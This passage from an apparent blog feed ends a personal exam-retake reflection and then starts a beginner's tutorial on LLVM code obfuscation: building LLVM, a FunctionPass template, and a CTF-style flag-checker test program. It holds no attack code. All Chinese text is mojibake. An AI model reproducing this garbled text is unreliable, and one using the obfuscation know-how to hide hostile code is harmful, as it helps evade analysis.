æˆä¸å°çš„å½±å“ã€‚</p><p>å…¶æ¬¡æ˜¯éš¾åœ¨ä¸ªäººçš„å®šåŠ›ä¸è°ƒæ•´èƒ½åŠ›ï¼Œå†å®Œç¾çš„å¤ä¹ è§„åˆ’ä¹Ÿä¼šé‡åˆ°æ„å¤–æƒ…å†µï¼Œå¦‚ä½•è°ƒæ•´å¤ä¹ è®¡åˆ’å’Œä¸ªäººçš„çŠ¶æ€éå¸¸é‡è¦ï¼Œåšçš„è®¡åˆ’ä¸€å®šè¦ç•™å®¹é”™æ¥åº”å¯¹æ„å¤–çš„å‘ç”Ÿï¼Œæ›´è¦åŠæ—¶è°ƒæ•´è‡ªå·±çš„çŠ¶æ€ï¼Œå°¤å…¶æ˜¯ä¸è¦å»æŠ±æ€¨æ„å¤–å‘ç”Ÿï¼Œè€Œæ˜¯è¦æ‰¾åˆ°æœ€ä¼˜è§£æ¥è§£å†³é—®é¢˜ã€‚å¤ä¹ ä¸€å®šè¦å¤Ÿåçš„ä½ï¼Œå¤Ÿçº¯ç²¹ï¼Œä¸èƒ½ä¸‰å¿ƒäºŒæ„ã€‚</p><p>æœ€åæ˜¯åšæŒå’Œè„šè¸å®åœ°ï¼Œå¤ä¹ åƒä¸‡ä¸èƒ½æœ‰ä¾¥å¹¸å¿ƒç†ã€‚æ²¡èƒŒå®Œè‚–4çœŸçš„å¾ˆé—æ†¾ï¼›æ²¡æœ‰åšæŒèƒŒå•è¯åªå¯„æ‰˜äºæŠ€å·§çš„ä¸‹åœºå°±æ˜¯é¢˜ç›®å’Œé€‰é¡¹éƒ½è¯»ä¸æ‡‚ï¼›ä¸ç»ƒè®¡ç®—ä¸åˆ·é¢˜çš„ä¸‹åœºå°±æ˜¯åšé¢˜å®šä½ä¸åˆ°çŸ¥è¯†ç‚¹è¿˜å·¨ä»–å¦ˆæ…¢ï¼›åå¤æ˜¯é—å¿˜ä»–å¦ˆï¼Œå­¦ 408 ä¸€å®šè¦å­¦çš„æ¯”å¿˜å¾—å¿«</p><blockquote><p>2023.1.6 æ™š 9 ç‚¹ </p><p>å›å®¶ä»¥åå‘äº†ä¸¤å¤©çƒ§ï¼Œé€€çƒ§ä»¥åæ²¡æœ‰åˆ€ç‰‡å—“ä¹Ÿæ²¡æœ‰å–‰å’™ç—›ï¼Œåªæ˜¯è§‰å¾—å¾ˆç´¯ï¼Œç—‡çŠ¶ç®—æ˜¯æ¯”è¾ƒè½»ã€‚</p><p>ä»”ç»†æ€è€ƒä»¥åè¿˜æ˜¯å†³å®šäºŒæˆ˜ï¼Œå†åŠªåŠ›ä¸€å¹´ï¼Œè¦è¿˜æ˜¯å› ä¸ºè‡ªå·±çš„åŸå› æˆ–è€…æ˜¯çœŸçš„å®åŠ›ä¸å¤Ÿï¼Œä¹Ÿè®¤äº†ï¼Œåˆ°æ—¶å€™èˆ¹åˆ°æ¡¥å¤´è‡ªç„¶ç›´ï¼Œå“¥ä»¬è‡³å°‘ä¸æ˜¯å¤§å­¦å››å¹´æµ‘æµ‘å™©å™©è¿‡çš„ï¼Œèƒ½è°ƒå›æ¥è°ƒå›æ¥ï¼Œå¤§ä¸äº†æ¢ä¸ªèµ›é“å»å‡ºå›½æˆ–è€…è€ƒå…¬ï¼Œå®åœ¨ä¸è¡ŒæŠŠæŠ€æœ¯æ¡å›æ¥å»ä¸Šç­ã€‚</p><p>æ‰€ä»¥è¿™ä¸€è·¯é¢ æ²›æµç¦»çš„ç»“å±€æ˜¯ä»€ä¹ˆå‘¢ï¼Œæˆ‘å¸Œæœ›æ˜¯å¤§å™¨æ™šæˆå§ã€‚</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/%E5%A4%A7%E5%99%A8%E6%99%9A%E6%88%90.jpeg" alt="å¤§å™¨æ™šæˆ"></p>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´»æ‚è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¹´ç»ˆæ€»ç»“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆé›¶ï¼‰</title>
      <link href="/posts/32815/"/>
      <url>/posts/32815/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="LLVM-ç®€ä»‹"><a href="#LLVM-ç®€ä»‹" class="headerlink" title="LLVM ç®€ä»‹"></a>LLVM ç®€ä»‹</h1><p>ä¸€ä¸ªåŒ…å«äº†å¾ˆå¤šæ¨¡å—çš„ç¼–è¯‘å™¨æ¡†æ¶ï¼Œå› ä¸ºå…¶ LLVM Pass æ¡†æ¶çš„ç‰¹æ®Šæ€§ï¼Œèƒ½å¤Ÿå¹²é¢„ä¸­é—´ä»£ç çš„ä¼˜åŒ–è¿‡ç¨‹ï¼Œè·Ÿä»£ç æ··æ·†æŠ€æœ¯å¥‘åˆåº¦å¾ˆé«˜ï¼Œæ‰€ä»¥ LLVM ç¼–è¯‘å™¨å¸¸è¢«ç”¨æ¥ç ”ç©¶ä»£ç æ··æ·†ã€‚</p><h2 id="LLVM-ç¼–è¯‘è¿‡ç¨‹"><a href="#LLVM-ç¼–è¯‘è¿‡ç¨‹" class="headerlink" title="LLVM ç¼–è¯‘è¿‡ç¨‹"></a>LLVM ç¼–è¯‘è¿‡ç¨‹</h2><p>å‰ç«¯ï¼šClang</p><p>å‰ç«¯å¯¹é«˜çº§è¯­è¨€æºä»£ç è¿›è¡Œè¯æ³•åˆ†æã€è¯­æ³•åˆ†æå’Œè¯­ä¹‰åˆ†æï¼Œæœ€åäº§ç”Ÿä¸­é—´ä»£ç  LLVM IRã€‚</p><p>ä¼˜åŒ–å™¨ï¼Œåç«¯ï¼šLLVM Core</p><p>ä¼˜åŒ–å™¨å¯¹ä¸­é—´ä»£ç  LLVM IR è¿›è¡Œä¼˜åŒ–ï¼Œå¹¶ä¸”èƒ½å¤ŸåŠ è½½ LLVM Pass æ‰§è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„ä¼˜åŒ–ï¼ˆæœ¬ç ”ç©¶ç”¨äºä»£ç æ··æ·†ï¼‰ã€‚</p><p>åç«¯åˆ™æ ¹æ®ä¼˜åŒ–åçš„ä»£ç ç”Ÿæˆç›®æ ‡å¹³å°çš„æœºå™¨ä»£ç ã€‚</p><h2 id="LLVM-ç›®å½•ç»“æ„"><a href="#LLVM-ç›®å½•ç»“æ„" class="headerlink" title="LLVM ç›®å½•ç»“æ„"></a>LLVM ç›®å½•ç»“æ„</h2><ul><li>llvm&#x2F;include&#x2F;llvmï¼šLLVM æä¾›çš„ä¸€äº›å…¬å…±å¤´æ–‡ä»¶</li><li>llvm&#x2F;libï¼šLLVMå¤§éƒ¨åˆ†æºä»£ç å’Œä¸€äº›ä¸å…¬å¼€çš„å¤´æ–‡ä»¶</li><li>llvm&#x2F;lib&#x2F;Transformsï¼š<strong>æ‰€æœ‰ LLVM Pass çš„æºä»£ç </strong>å’Œä¸€äº› LLVM è‡ªå¸¦çš„ Pass</li></ul><h1 id="LLVM-ç¯å¢ƒæ­å»º"><a href="#LLVM-ç¯å¢ƒæ­å»º" class="headerlink" title="LLVM ç¯å¢ƒæ­å»º"></a>LLVM ç¯å¢ƒæ­å»º</h1><h2 id="å¼€å‘ç¯å¢ƒ"><a href="#å¼€å‘ç¯å¢ƒ" class="headerlink" title="å¼€å‘ç¯å¢ƒ"></a>å¼€å‘ç¯å¢ƒ</h2><ul><li>Ubuntu 18.04</li><li>LLVM 12.01</li><li>Cmake 3.22.1</li></ul><blockquote><p>ç”¨ Ubuntu 18.04 ç¼–è¯‘ LLVM 12.01 æ—¶ï¼Œcmake ç‰ˆæœ¬æŒ‡å®šä¸º 3.13 ä»¥ä¸Šï¼Œç›´æ¥ç”¨ apt å®‰è£…çš„ cmake æ˜¯ 3.10.2ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±ä¸‹è½½é«˜ç‰ˆæœ¬çš„ cmakeã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230127104321293.png" alt="image-20230127104321293"></p><p>æ­¥éª¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://cmake.org/files/v3.22/cmake-3.22.1.tar.gz</span><br><span class="line">tar -zxvf cmake-3.22.1.tar.gz</span><br><span class="line">mv cmake-3.22.1 /usr/local/bin/cmake</span><br><span class="line">cd /usr/local/bin/cmake</span><br><span class="line">./bootstrap</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ln -sf /usr/local/bin/cmake/bin/* /usr/bin/</span><br></pre></td></tr></table></figure><p>é—®é¢˜ï¼šCould NOT find Open SSL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libssl-dev</span><br></pre></td></tr></table></figure><p>é—®é¢˜ï¼šCmake error could not find CMAKE_ROOT </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash -r</span><br></pre></td></tr></table></figure></blockquote><h2 id="ç¬¬ä¸€æ­¥ï¼šä¸‹è½½-LLVM-Core-å’Œ-Clang-æºä»£ç "><a href="#ç¬¬ä¸€æ­¥ï¼šä¸‹è½½-LLVM-Core-å’Œ-Clang-æºä»£ç " class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šä¸‹è½½ LLVM-Core å’Œ Clang æºä»£ç "></a>ç¬¬ä¸€æ­¥ï¼šä¸‹è½½ LLVM-Core å’Œ Clang æºä»£ç </h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/llvm/llvm-project/releases/tag/llvmorg-12.0.1">Release LLVM 12.0.1 Â· llvm&#x2F;llvm-project Â· GitHub</a></p><ul><li><a href="https://github.com/llvm/llvm-project/releases/download/llvmorg-12.0.1/clang-12.0.1.src.tar.xz">clang-12.0.1.src.tar.xz</a></li><li><a href="https://github.com/llvm/llvm-project/releases/download/llvmorg-12.0.1/llvm-12.0.1.src.tar.xz">llvm-12.0.1.src.tar.xz</a></li></ul><p>åœ¨ <code>/home/llvm/Programs</code> æ–‡ä»¶å¤¹å†…åˆ›å»º <code>llvm-project</code> æ–‡ä»¶å¤¹ï¼Œå­˜æ”¾ä¸‹è½½çš„æºç å‹ç¼©åŒ…ã€‚</p><p>å°†ä¸¤ä¸ªå‹ç¼©åŒ…è§£å‹ä¹‹åæ”¹åä¸º llvm å’Œ clang ï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨ã€‚ </p><p>åœ¨åŒä¸€æ–‡ä»¶å¤¹å†…åˆ›å»ºåä¸º <code>build</code> çš„æ–‡ä»¶å¤¹ï¼Œå­˜æ”¾ç¼–è¯‘åçš„ LLVMã€‚ æ­¤æ—¶çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230127105808960.png" alt="image-20230127105808960"></p><h2 id="ç¬¬äºŒæ­¥ï¼šç¼–è¯‘-LLVM-é¡¹ç›®"><a href="#ç¬¬äºŒæ­¥ï¼šç¼–è¯‘-LLVM-é¡¹ç›®" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šç¼–è¯‘ LLVM é¡¹ç›®"></a>ç¬¬äºŒæ­¥ï¼šç¼–è¯‘ LLVM é¡¹ç›®</h2><p>åœ¨ llvm-project ç›®å½•ä¸‹åˆ›å»º <code>build.sh</code>ï¼Œå†™å…¥ä¸‹é¢å†…å®¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd build</span><br><span class="line">cmake -G &quot;Unix Makefiles&quot; -DLLVM_ENABLE_PROJECTS=&quot;clang&quot; \</span><br><span class="line">-DCMAKE_BUILD_TYPE=Release -DLLVM_TARGETS_TO_BUILD=&quot;X86&quot; \</span><br><span class="line">-DBUILD_SHARED_LIBS=On ../llvm</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="cmake-å‚æ•°è§£é‡Šï¼š"><a href="#cmake-å‚æ•°è§£é‡Šï¼š" class="headerlink" title="cmake å‚æ•°è§£é‡Šï¼š"></a>cmake å‚æ•°è§£é‡Šï¼š</h3><ul><li><p>-G â€œUnix Makefilesâ€ï¼šç”ŸæˆUnixä¸‹çš„Makefile </p></li><li><p>-DLLVM_ENABLE_PROJECTS&#x3D;â€clangâ€ï¼šé™¤äº† LLVM Core å¤–ï¼Œè¿˜éœ€è¦ç¼–è¯‘çš„å­é¡¹ç›®ã€‚ </p></li><li><p>-DLLVM_BUILD_TYPE&#x3D;Releaseï¼šåœ¨ cmake é‡Œï¼Œæœ‰å››ç§ç¼–è¯‘æ¨¡å¼ï¼šDebug, Release,  RelWithDebInfo, å’ŒMinSizeRelã€‚ä½¿ç”¨ Release æ¨¡å¼ç¼–è¯‘ä¼šèŠ‚çœå¾ˆå¤šç©ºé—´ã€‚ </p></li><li><p>-DLLVM_TARGETS_TO_BUILD&#x3D;â€X86â€ï¼šé»˜è®¤æ˜¯ ALLï¼Œé€‰æ‹© X86 å¯èŠ‚çº¦å¾ˆå¤šç¼–è¯‘æ—¶é—´ã€‚ </p></li><li><p>-DBUILD_SHARED_LIBS&#x3D;Onï¼šæŒ‡å®šåŠ¨æ€é“¾æ¥ LLVM çš„åº“ï¼Œå¯ä»¥èŠ‚çœç©ºé—´ã€‚ </p></li><li><p>make install æŒ‡ä»¤æ˜¯å°†ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œå¤´æ–‡ä»¶ç­‰å®‰è£…åˆ°æœ¬æœºçš„ &#x2F;usr&#x2F;local&#x2F;bin å’Œ &#x2F;usr&#x2F;local&#x2F;include ç›®å½•ï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨ã€‚</p></li></ul><p>æ‰§è¡Œ <code>build.sh</code> æ–‡ä»¶è‡ªåŠ¨å®‰è£…å’Œç¼–è¯‘ï¼Œç¼–è¯‘æ—¶é•¿ä»åå¤šåˆ†é’Ÿåˆ°æ•°å°æ—¶ï¼Œå…·ä½“æ—¶é—´ç”±æœºå™¨æ€§èƒ½å†³å®šã€‚</p><blockquote><p>æ‰§è¡Œ <code>build.sh</code> æ–‡ä»¶å¿…é¡»è¦æœ‰ç®¡ç†å‘˜æƒé™</p></blockquote><p>è¾“å…¥ <code>clang -v</code> ç¡®è®¤ç¼–è¯‘å’Œå®‰è£…æ˜¯å¦å®Œæˆï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230127110132043.png" alt="image-20230127110132043"></p><h1 id="LLVM-Pass-ç®€ä»‹"><a href="#LLVM-Pass-ç®€ä»‹" class="headerlink" title="LLVM Pass ç®€ä»‹"></a>LLVM Pass ç®€ä»‹</h1><p>LLVM Pass æ¡†æ¶æ˜¯æ•´ä¸ª LLVM æä¾›ç»™ç”¨æˆ·ç”¨æ¥å¹²é¢„ä»£ç ä¼˜åŒ–è¿‡ç¨‹çš„æ¡†æ¶ï¼Œå¯ä»¥ç”¨æ¥ç¼–å†™ä»£ç æ··æ·†å·¥å…·ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å†™ fuzzã€hook</p><p>ç¼–è¯‘åçš„ LLVM Pass é€šè¿‡ä¼˜åŒ–å™¨ opt è¿›è¡ŒåŠ è½½ï¼Œå¯ä»¥å¯¹ LLVM IR ä¸­é—´ä»£ç è¿›è¡Œ<strong>åˆ†æ</strong>å’Œ<strong>ä¿®æ”¹</strong>ï¼Œç”Ÿæˆæ–°çš„ä¸­é—´ä»£ç </p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230203010751961.png" alt="image-20230203010751961"></p><h2 id="ç¼–è¯‘æ–¹å¼"><a href="#ç¼–è¯‘æ–¹å¼" class="headerlink" title="ç¼–è¯‘æ–¹å¼"></a>ç¼–è¯‘æ–¹å¼</h2><p>ç¬¬ä¸€ç§ï¼šå’Œæ•´ä¸ª LLVM ä¸€èµ·é‡æ–°ç¼–è¯‘ï¼ŒPass ä»£ç éœ€è¦æ”¾åœ¨ llvm&#x2F;lib&#x2F;Transforms æ–‡ä»¶å¤¹ä¸­ï¼Œæ¯”è¾ƒè€—æ—¶</p><p>ç¬¬äºŒç§ï¼šé€šè¿‡ Cmake å¯¹ Pass è¿›è¡Œå•ç‹¬ç¼–è¯‘ï¼Œæ–¹ä¾¿å¿«æ·</p><p>ç¬¬ä¸‰ç§ï¼šä½¿ç”¨å‘½ä»¤è¡Œå¯¹ Pass è¿›è¡Œå•ç‹¬ç¼–è¯‘ï¼Œé¡¹ç›®è¶Šå¤§è¶Šä¸å¥½ç®¡ç†</p><h2 id="Pass-ç±»å‹"><a href="#Pass-ç±»å‹" class="headerlink" title="Pass ç±»å‹"></a>Pass ç±»å‹</h2><p>è®¾è®¡æ–° LLVM Pass æ—¶ï¼Œæœ€å…ˆéœ€è¦å†³å®šçš„å°±æ˜¯é€‰æ‹© Pass çš„ç±»å‹ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>ModulePassï¼ˆåŸºäºæ¨¡å—ï¼‰</li><li>FunctionPassï¼ˆåŸºäºå‡½æ•°ï¼‰</li><li>CallGraphPassï¼ˆåŸºäºè°ƒåŠ¨å›¾ï¼‰</li><li>LoopPassï¼ˆåŸºäºå¾ªç¯ï¼‰</li></ul><p>æ¯•è®¾å­¦ä¹ é‡ç‚¹æ˜¯ FunctionPass</p><ul><li>FunctionPass ä»¥å‡½æ•°ä¸ºå•ä½å¤„ç†</li><li>FunctionPass çš„å­ç±»å¿…é¡»å®ç° runOnFunctionï¼ˆFunction &amp;Fï¼‰å‡½æ•° </li><li>FunctionPass è¿è¡Œæ—¶ä¼šå¯¹ç¨‹åºä¸­æ¯ä¸€ä¸ªå‡½æ•°æ‰§è¡Œ runOnFunction å‡½æ•°</li></ul><h2 id="ç®€å•ç¼–å†™"><a href="#ç®€å•ç¼–å†™" class="headerlink" title="ç®€å•ç¼–å†™"></a>ç®€å•ç¼–å†™</h2><ul><li>åˆ›å»ºä¸€ä¸ªç±»ï¼ˆclassï¼‰ï¼Œç»§æ‰¿ FunctionPass çˆ¶ç±»</li><li>åœ¨åˆ›å»ºçš„ç±»ä¸­å®ç° runOnFunctionï¼ˆFunction &amp;Fï¼‰å‡½æ•°</li><li>å‘ LLVM æ³¨å†Œ Pass ç±»</li></ul><h2 id="ä»£ç æ¨¡æ¿"><a href="#ä»£ç æ¨¡æ¿" class="headerlink" title="ä»£ç æ¨¡æ¿"></a>ä»£ç æ¨¡æ¿</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Demo</span> : <span class="keyword">public</span> FunctionPass&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">        <span class="built_in">Demo</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runOnFunction å‡½æ•°å®ç°</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Demo::runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> Demo::ID = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// æ³¨å†Œè¯¥ Demo Pass</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Demo&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;Pass æè¿°.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h2><ul><li>ç›´æ¥ä½¿ç”¨ Cmake è¿›è¡Œç¼–è¯‘</li><li>åœ¨ Build æ–‡ä»¶å¤¹å†…å¯ä»¥æ‰¾åˆ°ç¼–è¯‘å¥½çš„ so æ–‡ä»¶</li></ul><h2 id="åŠ è½½"><a href="#åŠ è½½" class="headerlink" title="åŠ è½½"></a>åŠ è½½</h2><p>ä½¿ç”¨ä¼˜åŒ–å™¨ opt å°†å¤„ç†ä¸­é—´ä»£ç ï¼Œç”Ÿæˆæ–°çš„ä¸­é—´ä»£ç ï¼Œä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt -load ./LLVMObfuscator.so -hlw -S hello.ll -o hello_opt.ll</span><br></pre></td></tr></table></figure><ul><li><code>-load</code> åŠ è½½ç¼–è¯‘å¥½çš„ LLVM Pass è¿›è¡Œä¼˜åŒ–</li></ul><h2 id="Cmake-é¡¹ç›®åˆ›å»º"><a href="#Cmake-é¡¹ç›®åˆ›å»º" class="headerlink" title="Cmake é¡¹ç›®åˆ›å»º"></a>Cmake é¡¹ç›®åˆ›å»º</h2><h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><ul><li>Build</li><li>Test<ul><li>TestProgram.cpp</li></ul></li><li>Transforms<ul><li>include</li><li>src<ul><li>HelloWorld.cpp</li></ul></li><li>CMakeLists.txt</li></ul></li><li>test.sh</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230203013038708.png"></p><h3 id="ç›®å½•ä»‹ç»"><a href="#ç›®å½•ä»‹ç»" class="headerlink" title="ç›®å½•ä»‹ç»"></a>ç›®å½•ä»‹ç»</h3><p>Buildï¼šå­˜æ”¾ç¼–è¯‘åçš„ LLVM Pass</p><p>Testï¼šå­˜æ”¾æµ‹è¯•ç¨‹åº TestProgram.cpp</p><p>TestProgram.cppï¼šå¾…æ··æ·†æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> input[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> enc[<span class="number">100</span>] = <span class="string">&quot;\x67\x75\x61\x72\x5b\x6a\x66\x93\x8c\x8a\x86\x89\x7f\x49\x8b\x7f\x93\x2e\x7f\x52\x63\x61\x6e\x67\x7f\x75\x7d\x21\x61\x9d&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *dest, <span class="type">char</span> *src)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(src);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dest[i] = (src[i] + (<span class="number">32</span> - i)) ^ i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//GUETCTF&#123;llvm_1s_s0_4king_ea5y&#125;</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dest[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">encrypt</span>(dest, input);</span><br><span class="line">    <span class="type">bool</span> result = <span class="built_in">strlen</span>(input) == <span class="number">30</span> &amp;&amp; !<span class="built_in">memcmp</span>(dest, enc, <span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span> (result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulations~\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sorry try again.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transforms&#x2F;include æ–‡ä»¶å¤¹ï¼šå­˜æ”¾æ•´ä¸ª LLVM Pass é¡¹ç›®çš„å¤´æ–‡ä»¶</p><p>Transforms&#x2F;src æ–‡ä»¶å¤¹ï¼šå­˜æ”¾æ•´ä¸ª LLVM Pass é¡¹ç›®çš„æºä»£ç </p><p>Transforms&#x2F;src&#x2F;HelloWorld.cppï¼šHelloWorld Pass çš„æºä»£ç ï¼Œä¸€èˆ¬ä¸€ä¸ª Pass ä½¿ç”¨ä¸€ä¸ª cpp æ–‡ä»¶å®ç°å³å¯</p><p>Transforms&#x2F;CMakeLists.txtï¼šæ•´ä¸ª CMake é¡¹ç›®çš„é…ç½®æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼šhttps://llvm.org/docs/CMake.html#developing-llvm-passes-out-ofsource</span></span><br><span class="line"><span class="keyword">project</span>(OLLVM++)<span class="comment"># æ•´ä¸ªé¡¹ç›®åç§°</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.13</span>.<span class="number">4</span>)<span class="comment"># CMake æœ€ä½ç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">find_package</span>(LLVM REQUIRED CONFIG)</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>(APPEND CMAKE_MODULE_PATH <span class="string">&quot;$&#123;LLVM_CMAKE_DIR&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">include</span>(AddLLVM)</span><br><span class="line"><span class="keyword">include_directories</span>(<span class="string">&quot;./include&quot;</span>) <span class="comment"># åŒ…å« ./include æ–‡ä»¶å¤¹ä¸­çš„å¤´æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">separate_arguments</span>(LLVM_DEFINITIONS_LIST NATIVE_COMMAND <span 